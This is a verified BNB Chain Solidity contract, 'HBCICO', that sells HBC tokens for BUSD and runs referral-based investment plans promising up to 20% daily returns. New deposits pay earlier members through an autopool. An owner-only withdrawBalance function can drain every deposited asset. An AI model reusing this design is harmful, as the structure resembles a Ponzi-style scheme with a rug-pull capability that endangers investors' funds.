/**
 *Submitted for verification at BscScan.com on 2021-08-27
*/

// owner 0xc95E9785E8934e2aD283Af8A8B1ee292F256CB0F
// HYBN 0x1ce91ddadfcea8686eefbdb5dd922ffa59524732  token bnb
// busd 0xcf1aecc287027f797b99650b1e020ffa0fb0e248  busd  token
// hbc 0x0ee439C3110fBe014231CD915fc15a0a76AF6CF7 invest bnb


pragma solidity 0.5.4;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender)
  external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value)
  external returns (bool);
  
  function transferFrom(address from, address to, uint256 value)
  external returns (bool);
  function burn(uint256 value)
  external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract HBCICO 
{
     using SafeMath for uint256;
     
       struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }

    struct Pool 
    {
        address currentReferrer;
        address[] referrals;
    }

    struct User {
        uint256 id;
        address referrer;
        uint256 levelBonus;
        uint256 selfBuy;
        uint256 selfSell;
        uint256 planCount;
        uint256 currentPlanId;
        uint256 currentCapping;
        uint256 withdrawalType;
        uint256 totalWithdrawal;
        mapping(address => Pool) autoPool;
        mapping(uint256 => Investment) plans;
        mapping(uint256 => uint256) refInvest;
        mapping(uint256 => uint256) refMember;
    }
    
    bool public saleOpen=false;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    Plan[] private investmentPlans_;
    uint256[] public Plans = [100000000000000000000,300000000000000000000,500000000000000000000,1000000000000000000000,5000000000000000000000];
    
    uint256 private constant INTEREST_CYCLE = 1 days;

    uint256 public lastUserId = 2;
    uint256 public lastPoolId = 1;
    
    uint256 public  tokenPrice=3*1e17;
    uint256 public  total_token_buy=0;
    uint256 public  total_token_sale=0;
    uint256 public  priceGap=0;
    uint64  public  priceIndex=1;
    
    uint256 public  MINIMUM_BUY=1e18;
    uint256 public  MINIMUM_SALE=1e17;
    
    address public owner;
    
    mapping(uint64 => uint) public buyLevel;
    mapping(uint64 => uint) public priceLevel;
  
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId, uint256 block_timestamp);
    event CycleStarted(address indexed user, uint256 walletUsed,  uint256 block_timestamp);
    event TokenDistribution(address indexed sender, address indexed receiver, uint total_token, uint live_rate, uint bnb_amount, uint256 block_timestamp);
    event onWithdraw(address  _user, uint256 withdrawalAmount, uint256 block_timestamp);
    event onInvest(address  _user, uint256 investamount, uint256 block_timestamp);
    event onDirectIncome(address referrer, address  _user, uint256 directIncome, uint256 block_timestamp);
    event onPoolIncome(address _user, address  _from, uint256 poolIncome, uint256 block_timestamp);
    IBEP20 private hbcToken; 
    IBEP20 private busdToken; 

    constructor(address ownerAddress, IBEP20 _hbcToken, IBEP20 _busdToken) public 
    {
        owner = ownerAddress;
        
        hbcToken = _hbcToken;
        busdToken = _busdToken;
        
        investmentPlans_.push(Plan(4,550*60*60*24,4)); //0.4 days and 660%
        investmentPlans_.push(Plan(5,500*60*60*24,5)); //0.5 days and 625%
        investmentPlans_.push(Plan(6,466*60*60*24,6)); //0.6 days and 560%
        investmentPlans_.push(Plan(7,428*60*60*24,7)); //0.666 days and 480%
        investmentPlans_.push(Plan(10,320*60*60*24,10)); //1 days and 350%
        
        investmentPlans_.push(Plan(50,550*60*60*24,50)); //5% days and 660%
        investmentPlans_.push(Plan(100,500*60*60*24,100)); //10% days and 625%
        investmentPlans_.push(Plan(120,466*60*60*24,120)); //12% days and 560%
        investmentPlans_.push(Plan(160,428*60*60*24,160)); //16% days and 480%
        investmentPlans_.push(Plan(200,320*60*60*24,200)); //20% days and 350%
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            levelBonus: uint(0),
            selfBuy: uint(0),
            selfSell: uint(0),
            planCount: uint(0),
            currentPlanId:uint(0),
            currentCapping: uint(0),
            withdrawalType:1,
            totalWithdrawal: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
    } 
    
    function() external payable 
    {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,0);
        }
        
        registration(msg.sender, bytesToAddress(msg.data),0);
    }

    function withdrawBalance(uint256 amt,uint8 _type) public{
        require(msg.sender == owner, "onlyOwner");
        if(_type==1)
        msg.sender.transfer(amt);
        else if(_type==2)
        busdToken.transfer(msg.sender,amt);
        else
        hbcToken.transfer(msg.sender,amt);
    }
    
    function registration(address userAddress, address referrerAddress,uint256 withType) private{
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            levelBonus: 0,
            selfBuy: 0,
            selfSell: 0,
            planCount: 0,
            currentPlanId:0,
            currentCapping: 0,
            withdrawalType:withType,
            totalWithdrawal: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        address poolPromoter=idToAddress[lastPoolId];
        
       // users[userAddress].autoPool[poolPromoter].
        users[userAddress].autoPool[userAddress].currentReferrer=poolPromoter;
        users[poolPromoter].autoPool[poolPromoter].referrals.push(userAddress);
        _calculatePoolReward(poolPromoter,userAddress);
        if(users[poolPromoter].autoPool[poolPromoter].referrals.length>=2)
        {
          lastPoolId++;  
        }

        lastUserId++;
   
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id,block.timestamp);
    }
    
    function _invest(uint256 _planId,address referrer,uint256 withType) public{
        require(_planId >= 0 && _planId<5, "Wrong investment plan id");
        uint256 _amount= get_plan_amount(_planId);
        require(hbcToken.balanceOf(msg.sender)>=_amount,"Low wallet balance");
        require(hbcToken.allowance(msg.sender,address(this))>=_amount,"Allow token first");
        hbcToken.transferFrom(msg.sender,address(this),_amount);
        
        if(!isUserExists(msg.sender))
        {
            registration(msg.sender, referrer,withType);  
        }
        else
        {
            require(_planId>=users[msg.sender].currentPlanId, "Plan id should be equal or greater than last investment.");
        }
        require(isUserExists(msg.sender), "user not exists");
        uint256 planCount = users[msg.sender].planCount;
        
        users[msg.sender].plans[planCount].planId = _planId;
        users[msg.sender].plans[planCount].investmentDate = block.timestamp;
        users[msg.sender].plans[planCount].lastWithdrawalDate = block.timestamp;
        users[msg.sender].plans[planCount].investment = _amount;
        users[msg.sender].plans[planCount].currentDividends = 0;
        users[msg.sender].plans[planCount].isExpired = false;
        users[msg.sender].planCount = users[msg.sender].planCount.add(1);
        users[msg.sender].currentPlanId=_planId;
        uint256 rplanCount = users[users[msg.sender].referrer].planCount;

        uint256 roidincome;
        uint256 refplanid;
        if(users[users[msg.sender].referrer].currentPlanId==0)
        {
            roidincome= _amount.mul(4).div(1000);
            refplanid=5;
        }
        else if(users[users[msg.sender].referrer].currentPlanId==1)
        {
            roidincome= _amount.mul(5).div(1000);
             refplanid=6;
        }
        else if(users[users[msg.sender].referrer].currentPlanId==2)
        {
            roidincome= _amount.mul(6).div(1000);
             refplanid=7;
        }
        else if(users[users[msg.sender].referrer].currentPlanId==3)
        {
            roidincome= _amount.mul(7).div(1000);
             refplanid=8;
        }
        else if(users[users[msg.sender].referrer].currentPlanId==4)  
        {
            roidincome= _amount.mul(10).div(1000);
             refplanid=9;
        }

        users[users[msg.sender].referrer].plans[rplanCount].planId = refplanid;

        users[users[msg.sender].referrer].plans[rplanCount].investmentDate = block.timestamp;

        users[users[msg.sender].referrer].plans[rplanCount].lastWithdrawalDate = block.timestamp;

        users[users[msg.sender].referrer].plans[rplanCount].investment = (roidincome);

        users[users[msg.sender].referrer].plans[rplanCount].currentDividends = 0;

        users[users[msg.sender].referrer].plans[rplanCount].isExpired = false;

        users[users[msg.sender].referrer].planCount = users[users[msg.sender].referrer].planCount.add(1);

        emit onInvest(users[msg.sender].referrer, (roidincome),block.timestamp);
        
        if(msg.sender!=owner)
        {
            uint256 ref_percent=get_ref_percent(users[users[msg.sender].referrer].currentPlanId);
            uint256 _directincome= _amount.mul(ref_percent).div(1000);
            (uint256 exactAmount,bool isDone)=getExactAmount(users[msg.sender].referrer, _directincome);
            hbcToken.transfer(users[msg.sender].referrer,exactAmount);
            users[users[msg.sender].referrer].totalWithdrawal=users[users[msg.sender].referrer].totalWithdrawal+exactAmount;
            if(isDone)
            {
               stopDividends(users[msg.sender].referrer); 
            }
            emit onDirectIncome(users[msg.sender].referrer,msg.sender,exactAmount,block.timestamp);
        }
        emit CycleStarted(msg.sender, _amount, block.timestamp);
    }

    function buyToken(uint256 tokenQty) public payable{
         require(!isContract(msg.sender),"Can not be contract");
         require(tokenQty>=MINIMUM_BUY,"Invalid minimum quantity");
         uint256 buy_amt=(tokenQty.div(1e18)).mul(tokenPrice);
         require(busdToken.balanceOf(msg.sender)>=(buy_amt),"Low Balance");
         require(busdToken.allowance(msg.sender,address(this))>=buy_amt,"Invalid buy amount");
         
         users[msg.sender].selfBuy=users[msg.sender].selfBuy+tokenQty;
         busdToken.transferFrom(msg.sender ,address(this), (buy_amt));
         hbcToken.transfer(msg.sender , tokenQty);
         
         total_token_buy=total_token_buy+tokenQty;
         emit TokenDistribution(address(this), msg.sender, tokenQty, tokenPrice, buy_amt,block.timestamp);                  
     }
    
    function withdraw() public payable{
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = users[msg.sender].id;
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i=0; i<users[msg.sender].planCount; i++) 
        {
            if (users[msg.sender].plans[i].isExpired) {
                continue;
            }

            Plan storage plan = investmentPlans_[users[msg.sender].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = users[msg.sender].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(users[msg.sender].plans[i].investment , plan.dailyInterest , withdrawalDate , users[msg.sender].plans[i].lastWithdrawalDate , plan.maxDailyInterest);

            withdrawalAmount += amount;
            
            users[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            users[msg.sender].plans[i].isExpired = isExpired;
            users[msg.sender].plans[i].currentDividends += amount;
        }
        (uint256 exactAmount,bool isDone)=getExactAmount(msg.sender, withdrawalAmount);
        hbcToken.transfer(msg.sender,exactAmount);
        users[msg.sender].totalWithdrawal=users[msg.sender].totalWithdrawal+exactAmount;
        if(isDone)
        {
           stopDividends(msg.sender); 
        }
        emit onWithdraw(msg.sender, exactAmount,block.timestamp);
    }
    
    function stopDividends(address _user) private{
        for (uint256 i=0; i<users[_user].planCount; i++) 
        {
            if (users[_user].plans[i].isExpired) {
                continue;
            }
            users[_user].plans[i].isExpired = true;
        }
    }
    
    function _calculatePoolReward(address _referrer,address  _from) private 
    {
        uint8 i;
        uint256 autop=13000000000000000000;
        uint256 income=(autop.div(tokenPrice)).mul(1e18);
         while(i<5)
         {
            (uint256 exactAmount,bool isDone)=getExactAmount(_referrer, income);
            hbcToken.transfer(_referrer,exactAmount);
            users[_referrer].totalWithdrawal=users[_referrer].totalWithdrawal+exactAmount;
            emit onPoolIncome(_referrer,  _from, exactAmount, block.timestamp);
            if(isDone)
            {
               stopDividends(_referrer); 
            }
            if(users[_referrer].autoPool[_referrer].currentReferrer!=address(0))
            _referrer=users[_referrer].autoPool[_referrer].currentReferrer;
            else
            break;
         }
     }
    
    function getInvestmentPlanByUID(address _user) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory){
       
        User storage investor = users[_user];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
                interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        isExpireds[i] = true;
                        interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                       interests[i] = investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                  interests[i] =  investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256){

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 1000 * INTEREST_CYCLE) / (60*60*24);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 1000 * secondsLeft) / (60*60*24);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
        }

    }
    
    function isContract(address _address) public view returns (bool _isContract){
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    }    
  
    function token_setting(uint min_buy,  uint min_sale) public payable{
           require(msg.sender==owner,"Only Owner");
              MINIMUM_BUY = min_buy;
              MINIMUM_SALE = min_sale;
             
    }
    
    function getExactAmount(address _user, uint256 amount) public view returns(uint256,bool)
    {
       uint256 investment=users[_user].plans[users[_user].planCount-1].investment;
       uint256 limit=(investment.mul(get_capping(users[_user].plans[users[_user].planCount-1].planId))).div(100);
       
       if(limit<(users[_user].totalWithdrawal.add(amount)) && _user!=owner)
       {
          return (limit.sub(users[_user].totalWithdrawal),true); 
       }
       else
       {
          return (amount,false); 
       }
    }
    
    function get_plan_amount(uint256 _id) public view returns(uint256){
       
      if(_id==0)
      return (Plans[0].div(tokenPrice)).mul(1e18);
      if(_id==1)
      return (Plans[1].div(tokenPrice)).mul(1e18);
      if(_id==2)
      return (Plans[2].div(tokenPrice)).mul(1e18);
      if(_id==3)
      return (Plans[3].div(tokenPrice)).mul(1e18);
      if(_id==4)
      return (Plans[4].div(tokenPrice)).mul(1e18);
   }
   
   function get_capping(uint256 _id) public pure returns(uint256){
       
      if(_id==0)
      return 220;
      if(_id==1)
      return 250;
      if(_id==2)
      return 280;
      if(_id==3)
      return 300;
      if(_id==4)
      return 320;
   }
    
    function get_ref_percent(uint256 _id) public pure returns(uint256){
      if(_id==0)
      return 50;
      if(_id==1)
      return 80;
      if(_id==2)
      return 100;
      if(_id==3)
      return 120;
      if(_id==4)
      return 180;
   }
    
    function isUserExists(address user) public view returns (bool){
        return (users[user].id != 0);
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}